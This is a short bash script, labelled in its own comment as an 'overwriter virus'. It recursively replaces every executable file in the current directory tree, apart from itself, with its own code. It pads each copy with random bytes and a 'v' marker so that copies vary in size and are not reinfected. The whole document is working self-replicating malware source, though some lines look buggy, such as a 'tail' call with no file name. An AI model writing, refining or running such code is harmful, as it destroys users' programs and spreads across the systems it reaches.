#!/bin/bash
# Overwriter virus with a signature 'v' and no payload.
function move_infect(){
	for file in *
	do
		# Call recursively in subdirectory
		if [ -d "$file" ]
		then
			cd "$file"
			move_infect "$1"
		fi
		
		# Infect executable file and avoid overwriting itself
		if [ -f "$file" ] && [ -x "$file" ] && [ "$file" != "$0" ]
		then
			# Avoid infect already infected file 
			if [ $(tail -c 1) != "v" ]
			then
				cp "$1" "$file"
				# Avoid having the same size for each infected file
				printf "%sv" $(head -c $(($RANDOM%10000)) /dev/urandom) >> "$file"
			fi
		fi
	done
}
move_infect "$PWD/$0"
